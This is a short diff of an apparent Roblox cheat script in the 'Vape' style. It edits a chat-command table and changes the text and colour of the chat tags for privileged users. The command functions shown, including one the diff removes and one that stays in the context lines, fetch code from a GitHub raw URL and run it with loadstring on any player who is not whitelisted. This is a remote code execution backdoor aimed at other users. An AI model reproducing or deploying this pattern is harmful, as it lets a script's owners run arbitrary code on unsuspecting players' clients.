@@ -10603,11 +10603,6 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Chip"))()
 		end
 	end,
-	[".byelex"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/ProReleased/ProReleased/main/Byelex"))()
-		end
-	end,
 	[".freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
@@ -10767,7 +10762,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["pink"].."'>[VAPE]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["pink"].."'>[]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10779,7 +10774,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ff4d4d'>[VAPE OWNER]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#33ccff'>[APE OWNER]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
